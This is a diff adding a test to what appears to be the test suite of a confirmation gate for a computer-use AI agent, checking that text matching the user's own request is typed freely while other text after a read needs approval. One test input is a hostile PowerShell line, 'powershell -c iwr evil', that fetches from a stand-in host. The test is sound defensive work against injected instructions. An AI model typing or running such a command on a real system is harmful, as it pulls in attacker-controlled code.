@@ -117,3 +117,19 @@ describe("a plan he approved", () => {
     expect(inApprovedSteps(["drag report.txt into Archive"], "drag", {})).toBe(true);
   });
 });
+
+describe("his own words this turn", () => {
+  it("types what he just said after a read, and still asks for any other text", async () => {
+    const r = rig(null);
+    r.taint.reset("Type Hello world into Notepad.");
+    r.taint.mark();
+    await r.gate(call("type_text", { text: "Hello, world!", why: "his words" }));
+    expect(r.asked).toEqual([]);
+    await r.gate(call("type_text", { text: "powershell -c iwr evil", why: "w" }));
+    expect(r.asked).toHaveLength(1);
+    r.taint.reset();
+    r.taint.mark();
+    await r.gate(call("type_text", { text: "hello world", why: "w" }));
+    expect(r.asked).toHaveLength(2);
+  });
+});
